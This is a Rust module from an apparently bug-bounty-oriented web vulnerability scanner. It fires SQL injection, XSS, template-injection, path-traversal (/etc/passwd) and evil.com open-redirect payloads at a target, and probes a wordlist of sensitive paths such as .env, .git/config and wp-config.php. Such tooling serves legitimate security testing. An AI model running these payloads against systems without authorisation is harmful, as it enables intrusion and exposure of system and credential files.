// ============================================================
// FUZZ MODULE — Parameter + Path Fuzzing
// Detects: SQLi, XSS, IDOR, path traversal, open redirects
// Throughput: ~300 concurrent workers (network I/O bound)
// ============================================================

use anyhow::Result;
use chrono::Utc;
use colored::*;
use dashmap::DashMap;
use futures::stream::{self, StreamExt};
use indicatif::{ProgressBar, ProgressStyle};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::sync::{Arc, atomic::{AtomicU64, Ordering}};
use std::time::Duration;
use tokio::fs;
use url::Url;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct FuzzResult {
    pub url: String,
    pub payload: String,
    pub status: u16,
    pub response_length: usize,
    pub response_time_ms: u64,
    pub anomaly_type: Option<String>,
    pub confidence: String,
    pub fuzzed_at: String,
}

// Vulnerability detection payloads
const SQLI_PAYLOADS: &[&str] = &[
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "1' ORDER BY 1--",
    "1 AND SLEEP(1)--",
    "1; SELECT SLEEP(1)--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
];

const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "{{7*7}}",   // SSTI detection
    "${7*7}",    // SSTI EL injection
];

const TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
];

const OPEN_REDIRECT_PAYLOADS: &[&str] = &[
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(document.domain)",
];

// SQLi error signatures in responses
const SQLI_ERROR_PATTERNS: &[&str] = &[
    "sql syntax",
    "mysql_fetch",
    "ora-0",
    "odbc sql",
    "microsoft ole db",
    "syntax error",
    "unclosed quotation",
    "pg_query",
    "sqlite_",
    "warning: mysql",
    "division by zero",
    "invalid query",
    "supplied argument is not a valid mysql",
    "you have an error in your sql syntax",
];

#[derive(Debug, Clone, PartialEq)]
enum FuzzMode {
    Paths,
    Params,
    Both,
    Vulns,
}

pub async fn run(
    base_url: String,
    wordlist_path: String,
    mode: String,
    concurrency: usize,
    method: String,
    output: String,
) -> Result<Vec<String>> {
    let fuzz_mode = match mode.to_lowercase().as_str() {
        "paths" => FuzzMode::Paths,
        "params" => FuzzMode::Params,
        "vulns" => FuzzMode::Vulns,
        _ => FuzzMode::Both,
    };

    println!(
        "  {} {} | mode={} method={} concurrency={}",
        "FUZZ".bright_blue().bold(),
        base_url.bright_white(),
        mode.yellow(),
        method.yellow(),
        concurrency.to_string().yellow()
    );

    let wordlist = match fs::read_to_string(&wordlist_path).await {
        Ok(c) => c,
        Err(_) => {
            println!("{} Using built-in wordlist", "⚠".yellow());
            builtin_fuzz_wordlist()
        }
    };

    let words: Vec<String> = wordlist
        .lines()
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(|l| l.trim().to_string())
        .collect();

    // Build all payloads to test
    let mut targets: Vec<(String, String)> = vec![]; // (url_to_test, payload_label)

    match &fuzz_mode {
        FuzzMode::Paths | FuzzMode::Both => {
            // Path fuzzing
            let parsed = Url::parse(&base_url)?;
            let base = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
            for word in &words {
                let test_url = format!("{}/{}", base.trim_end_matches('/'), word.trim_start_matches('/'));
                targets.push((test_url, format!("PATH:{}", word)));
            }
        }
        _ => {}
    }

    match &fuzz_mode {
        FuzzMode::Params | FuzzMode::Both => {
            // Parameter fuzzing with vuln payloads
            for payload in SQLI_PAYLOADS {
                let test = format!("{}?id={}", base_url, urlencoding(payload));
                targets.push((test, format!("SQLI:{}", payload)));
            }
            for payload in XSS_PAYLOADS {
                let test = format!("{}?q={}", base_url, urlencoding(payload));
                targets.push((test, format!("XSS:{}", payload)));
            }
            for payload in TRAVERSAL_PAYLOADS {
                let test = format!("{}?file={}", base_url, urlencoding(payload));
                targets.push((test, format!("TRAVERSAL:{}", payload)));
            }
            for payload in OPEN_REDIRECT_PAYLOADS {
                let test = format!("{}?redirect={}", base_url, urlencoding(payload));
                targets.push((test, format!("REDIRECT:{}", payload)));
            }
        }
        _ => {}
    }

    if let FuzzMode::Vulns = &fuzz_mode {
        // Vulnerability-only mode: just inject payloads
        for payload in SQLI_PAYLOADS.iter().chain(XSS_PAYLOADS).chain(TRAVERSAL_PAYLOADS) {
            let test = format!("{}?id={}&q={}&file={}", base_url,
                urlencoding(payload), urlencoding(payload), urlencoding(payload));
            targets.push((test, format!("VULN:{}", payload)));
        }
    }

    let total = targets.len() as u64;
    println!("  {} {} requests queued", "→".bright_blue(), total.to_string().yellow());

    // Baseline request to determine normal response
    let baseline_len = get_baseline_length(&base_url).await.unwrap_or(0);

    let client = Arc::new(
        Client::builder()
            .timeout(Duration::from_secs(8))
            .danger_accept_invalid_certs(false)
            .use_rustls_tls()
            .user_agent("Mozilla/5.0 (compatible; BountyHunter/0.1; security-research)")
            .redirect(reqwest::redirect::Policy::none())
            .build()?
    );

    let pb = Arc::new(ProgressBar::new(total));
    pb.set_style(
        ProgressStyle::with_template(
            "  [{elapsed_precise}] {bar:40.magenta/black} {pos}/{len} | {per_sec} | {msg}"
        )
        .unwrap()
        .progress_chars("█▓░"),
    );

    let results: Arc<DashMap<String, FuzzResult>> = Arc::new(DashMap::new());
    let anomaly_count = Arc::new(AtomicU64::new(0));

    stream::iter(targets)
        .map(|(url, payload_label)| {
            let client = Arc::clone(&client);
            let results = Arc::clone(&results);
            let pb = Arc::clone(&pb);
            let anomalies = Arc::clone(&anomaly_count);
            let method = method.clone();

            async move {
                pb.inc(1);
                let start = std::time::Instant::now();

                let req = match method.to_uppercase().as_str() {
                    "POST" => client.post(&url),
                    "PUT" => client.put(&url),
                    "DELETE" => client.delete(&url),
                    _ => client.get(&url),
                };

                match req.send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let response_time_ms = start.elapsed().as_millis() as u64;
                        let body = resp.text().await.unwrap_or_default();
                        let response_length = body.len();

                        // Anomaly detection
                        let anomaly = detect_anomaly(
                            &payload_label,
                            &body,
                            status,
                            response_length,
                            baseline_len,
                            response_time_ms,
                        );

                        if let Some(ref atype) = anomaly {
                            anomalies.fetch_add(1, Ordering::Relaxed);
                            pb.set_message(format!(
                                "🎯 {} → {}",
                                atype.bright_red().bold(),
                                url.bright_white()
                            ));

                            let confidence = if let Some(ref atype) = anomaly {
                                if atype.contains("SQL_INJECTION") || 
                                   atype.contains("XSS_REFLECTED") || 
                                   atype.contains("SSTI_DETECTED") || 
                                   atype.contains("PATH_TRAVERSAL") || 
                                   atype.contains("OPEN_REDIRECT") {
                                    "HIGH"
                                } else {
                                    "MEDIUM"
                                }
                            } else {
                                "LOW"
                            };

                            let result = FuzzResult {
                                url: url.clone(),
                                payload: payload_label.clone(),
                                status,
                                response_length,
                                response_time_ms,
                                anomaly_type: anomaly,
                                confidence: confidence.to_string(),
                                fuzzed_at: Utc::now().to_rfc3339(),
                            };
                            results.insert(format!("{}{}", url, payload_label), result);
                        } else if status == 200 && payload_label.starts_with("PATH:") {
                            // Interesting path found
                            let result = FuzzResult {
                                url: url.clone(),
                                payload: payload_label.clone(),
                                status,
                                response_length,
                                response_time_ms,
                                anomaly_type: Some("PATH_FOUND".to_string()),
                                confidence: "INFO".to_string(),
                                fuzzed_at: Utc::now().to_rfc3339(),
                            };
                            results.insert(format!("{}{}", url, payload_label), result);
                        }
                    }
                    Err(_) => {}
                }
            }
        })
        .buffer_unordered(concurrency)
        .collect::<Vec<_>>()
        .await;

    let anomalies = anomaly_count.load(Ordering::Relaxed);
    pb.finish_with_message(format!(
        "{} anomalies detected",
        anomalies.to_string().bright_red()
    ));

    let mut found: Vec<FuzzResult> = results.iter().map(|e| e.value().clone()).collect();
    found.sort_by(|a, b| {
        // Sort by confidence: HIGH > MEDIUM > LOW > INFO
        let priority = |c: &str| match c {
            "HIGH" => 0,
            "MEDIUM" => 1,
            "LOW" => 2,
            _ => 3,
        };
        priority(&a.confidence).cmp(&priority(&b.confidence))
    });

    if let Some(parent) = std::path::Path::new(&output).parent() {
        let _ = fs::create_dir_all(parent).await;
    }
    let json = serde_json::to_string_pretty(&found)?;
    fs::write(&output, json).await?;

    print_fuzz_summary(&found);

    let vuln_urls: Vec<String> = found
        .iter()
        .filter(|r| r.confidence == "HIGH" || r.confidence == "MEDIUM")
        .map(|r| r.url.clone())
        .collect();

    Ok(vuln_urls)
}

fn detect_anomaly(
    payload_label: &str,
    body: &str,
    status: u16,
    response_length: usize,
    baseline_len: usize,
    response_time_ms: u64,
) -> Option<String> {
    let body_lower = body.to_lowercase();

    // SQLi detection
    if payload_label.starts_with("SQLI:") {
        for pattern in SQLI_ERROR_PATTERNS {
            if body_lower.contains(pattern) {
                return Some(format!("SQL_INJECTION (error: {})", pattern));
            }
        }
        if response_time_ms > 2000 && payload_label.contains("SLEEP") {
            return Some("SQL_INJECTION (time-based blind)".to_string());
        }
    }

    // XSS detection (reflected)
    if payload_label.starts_with("XSS:") {
        let payload = payload_label.strip_prefix("XSS:").unwrap_or("");
        if body.contains(payload) && !payload.contains("{{") {
            return Some("XSS_REFLECTED".to_string());
        }
        // SSTI detection
        if payload.contains("{{7*7}}") && body.contains("49") {
            return Some("SSTI_DETECTED ({{7*7}}=49)".to_string());
        }
        if payload.contains("${7*7}") && body.contains("49") {
            return Some("SSTI_DETECTED (${7*7}=49)".to_string());
        }
    }

    // Path traversal
    if payload_label.starts_with("TRAVERSAL:") {
        if body.contains("root:") || body.contains("/bin/bash") || body.contains("[boot loader]") {
            return Some("PATH_TRAVERSAL (LFI)".to_string());
        }
    }

    // Open redirect
    if payload_label.starts_with("REDIRECT:") && matches!(status, 301 | 302 | 307 | 308) {
        return Some("OPEN_REDIRECT".to_string());
    }

    // Anomalous response size (potential IDOR or info leak)
    if response_length > baseline_len + 5000 && status == 200 {
        return Some(format!("RESPONSE_ANOMALY (+{}b vs baseline)", response_length - baseline_len));
    }

    // 403 bypass detection
    if status == 403 && payload_label.starts_with("PATH:") {
        // Worth noting 403s for potential bypass testing
    }

    None
}

async fn get_baseline_length(url: &str) -> Option<usize> {
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .use_rustls_tls()
        .build()
        .ok()?;
    let resp = client.get(url).send().await.ok()?;
    let body = resp.text().await.ok()?;
    Some(body.len())
}

fn urlencoding(s: &str) -> String {
    s.bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                String::from(b as char)
            }
            _ => format!("%{:02X}", b),
        })
        .collect()
}

fn print_fuzz_summary(results: &[FuzzResult]) {
    let high: Vec<&FuzzResult> = results.iter().filter(|r| r.confidence == "HIGH").collect();
    let medium: Vec<&FuzzResult> = results.iter().filter(|r| r.confidence == "MEDIUM").collect();

    if !high.is_empty() {
        println!("\n  {} HIGH CONFIDENCE FINDINGS:", "🔴".red());
        for r in &high {
            println!(
                "     {} {} → {}",
                "→".bright_red(),
                r.anomaly_type.as_deref().unwrap_or("?").bright_red().bold(),
                r.url.bright_white()
            );
            println!("       Payload: {}", r.payload.dimmed());
        }
    }

    if !medium.is_empty() {
        println!("\n  {} MEDIUM CONFIDENCE FINDINGS:", "🟡".yellow());
        for r in &medium {
            println!(
                "     {} {} → {}",
                "→".yellow(),
                r.anomaly_type.as_deref().unwrap_or("?").yellow(),
                r.url.bright_white()
            );
        }
    }

    println!(
        "\n  {} Total anomalies: HIGH={} MEDIUM={} Total={}",
        "SUMMARY".bright_blue().bold(),
        high.len().to_string().bright_red(),
        medium.len().to_string().yellow(),
        results.len().to_string().bright_white()
    );
}

fn builtin_fuzz_wordlist() -> String {
    vec![
        "admin", "administrator", "login", "dashboard", "panel",
        "api", "api/v1", "api/v2", "api/v3", "graphql",
        "rest", "json", "xml", "swagger", "swagger-ui",
        "openapi", "openapi.json", "openapi.yaml",
        ".env", ".git", ".git/config", ".htaccess",
        "config", "config.php", "config.js", "settings",
        "backup", "backup.zip", "backup.tar.gz", "db.sql",
        "robots.txt", "sitemap.xml", "crossdomain.xml",
        "wp-admin", "wp-login.php", "wp-config.php",
        "phpmyadmin", "adminer.php", "mysql",
        "test", "debug", "trace", "status", "health",
        "metrics", "actuator", "actuator/env", "actuator/beans",
        "server-status", "server-info",
        "upload", "uploads", "files", "media",
        "shell", "cmd", "execute", "eval",
        "user", "users", "account", "accounts",
        "profile", "profiles", "me", "self",
        "password", "passwd", "credentials", "secret", "secrets",
        "token", "tokens", "key", "keys", "cert", "certs",
        "internal", "private", "hidden", "restricted",
        "proxy", "forward", "redirect",
        "xmlrpc.php", "xml-rpc",
        "vendor", "node_modules", "src", "source",
        "index.php", "index.asp", "index.aspx",
    ]
    .join("\n")
}
